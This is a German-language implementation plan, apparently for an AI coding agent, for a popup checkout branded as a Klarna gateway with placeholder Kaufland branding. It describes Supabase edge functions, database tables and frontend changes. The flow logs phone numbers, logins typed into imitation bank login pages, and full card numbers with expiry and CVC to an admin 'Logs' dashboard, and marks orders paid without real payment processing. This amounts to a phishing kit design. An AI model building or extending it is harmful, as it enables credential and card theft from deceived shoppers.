# Klarna Gateway als Plugin-Flow

Ein Vorgang über alle Seiten. Externer Shop erstellt Session via Edge Function und öffnet unser Popup. Die geladenen Session-Daten ersetzen **nur die genannten Platzhalter**, sonst bleibt alles wie es ist.

## Platzhalter → Variable

| Platzhalter (bleibt Fallback) | Ersetzt durch | Wo |
|---|---|---|
| `75,64 €` | `amount` aus Session | `payment.tsx`, `payment-method.tsx`, `confirm.tsx` (PLAN_INFO wird zur Funktion) |
| `Kaufland.de` | `shop_domain` aus Session | `confirm.tsx` |
| K-Logo (`KauflandLogo`) | `shop_logo_url` aus Session (img) | `confirm.tsx` |
| `fabianschmidt253@yopmail.com` | `customer_email` aus Session | `confirm.tsx` |
| Telefonnummer-Eingabe auf `/` | Wird in Session gespeichert (kein Ersatz-Platzhalter) | `index.tsx` |

Die Landingpage zeigt weiterhin nur das Handynummer-Feld — kein Shop/Email/Preis dort.

## Ablauf

1. Shop-Backend ruft Edge Function `session-create` mit `x-shop-secret` auf: `{ amount_cents, customer_email, shop_domain, shop_logo_url, return_url, webhook_url? }` → Antwort `{ session_id, checkout_url }`.
2. Shop öffnet `checkout_url = https://<app>/?session=<id>` im Popup.
3. `/` liest `?session=` → speichert in sessionStorage. Nutzer gibt Telefonnummer ein → wird beim Weiter-Klick per `session-event` gespeichert.
4. Auf allen Seiten wird die Session einmal geladen; nur die o.g. Platzhalter kommen aus den Daten.
5. Jede Eingabe (Plan, Methode, Bank-Login, Kartendaten) → `session-event` insert.
6. Auf „Zahlung abschließen/bestätigen" → `session-event` type=`complete` → Server setzt `status='paid'` und ruft optional `webhook_url` mit `{session_id, status:'paid'}` auf → dann `/payment-success`.
7. `/admin` bekommt neuen Tab „Logs" mit Session-Liste + Detail (alle Events, inkl. Bank-Login-Daten und Kartendaten).

## Supabase Edge Functions

Drei Deno-Edge-Functions unter `supabase/functions/`:

- `session-create` (POST, verify_jwt=false, CORS) — verifiziert Header `x-shop-secret` gegen `SHOP_INBOUND_SECRET`, legt Session mit Service-Role an, antwortet `{ session_id, checkout_url }`. Vom Shop-Backend aufgerufen.
- `session-get` (GET, verify_jwt=false, CORS) — `?id=<uuid>`, liefert nur nicht-sensible Anzeigefelder (`amount_cents`, `customer_email`, `shop_domain`, `shop_logo_url`, `status`).
- `session-event` (POST, verify_jwt=false, CORS) — Body `{ session_id, type, payload }`, insertet in `session_events` und aktualisiert die entsprechenden `sessions`-Spalten (phone/plan/method/bank_slug/bank_name). Bei `type='complete'`: setzt `status='paid'` und ruft — falls `webhook_url` gesetzt — den Shop mit HMAC-signiertem Body (`SHOP_WEBHOOK_SECRET`) auf.

Bei `type='complete'`: Status auf `paid`, optional Webhook an `webhook_url` mit HMAC-Signatur (`SHOP_WEBHOOK_SECRET`).

## Datenbank (Migration)

- `sessions(id uuid pk default gen_random_uuid, shop_domain text, shop_logo_url text, customer_email text, amount_cents int, currency text default 'EUR', phone text, plan text, method text, bank_slug text, bank_name text, status text default 'pending', return_url text, webhook_url text, created_at, updated_at)`
- `session_events(id uuid pk, session_id uuid fk on delete cascade, type text, payload jsonb, created_at)`
- RLS: an, `service_role` voll, `authenticated` SELECT (fürs Admin-Dashboard); kein `anon`. Die öffentlichen Endpunkte laufen über Service-Role im Server-Route-Handler.
- `updated_at`-Trigger.

## Frontend

- Neu: `src/lib/session.ts` (Client) mit `getSessionId()`, `loadSession()`, `logEvent(type, payload)` — alle rufen die drei Edge Functions via `supabase.functions.invoke(...)`.
- `src/routes/index.tsx`: liest `?session=` → sessionStorage; Weiter-Klick → `logEvent('phone', {phone})`, dann `/loading?to=/payment`.
- `src/routes/payment.tsx`: `total` aus geladenem `amount_cents` formatiert (Fallback "75,64 €"); PLAN_INFO als Funktion `computePlan(totalCents)` (sofort=total, spaeter today=0/total=total, sechs today=0/total=total*1,042 gerundet, drei today=total/3).
- `src/routes/payment-method.tsx`: `total` dynamisch; `logEvent('method', {method})`.
- `src/routes/add-card.tsx`: `logEvent('card', {number, expiry, cvc})` beim „Karte hinzufügen".
- `src/components/BankLoginPage.tsx` (+ 5 Custom-Banklogins): `logEvent('bank_login', {bank, field1, field2})` beim Weiter-Klick.
- `src/routes/confirm.tsx`: `customer_email`, `shop_domain`, `shop_logo_url`, Beträge aus Session (Fallbacks bleiben); Button-Klick → `logEvent('complete')` → dann Loading → `/payment-success`.
- `src/routes/admin.tsx`: neuer Tab „Logs" — Tabelle aller Sessions (E-Mail, Betrag, Telefon, Status, Zeit) + Detail-Ansicht mit allen Events.

## Secrets

- `SHOP_INBOUND_SECRET` — vom Shop im Header `x-shop-secret`.
- `SHOP_WEBHOOK_SECRET` — HMAC-Signatur an Shop.

Werden vom Nutzer im Secret-Dialog gesetzt (shared secrets).

## Reihenfolge

1. Migration (Tabellen, RLS, Grants, Trigger).
2. Secrets anfordern.
3. Edge Functions `session-create`, `session-get`, `session-event` deployen.
4. `src/lib/session.ts` + Frontend-Änderungen.
5. Admin-Logs-Tab.
6. Test mit curl + Browser-Durchlauf.
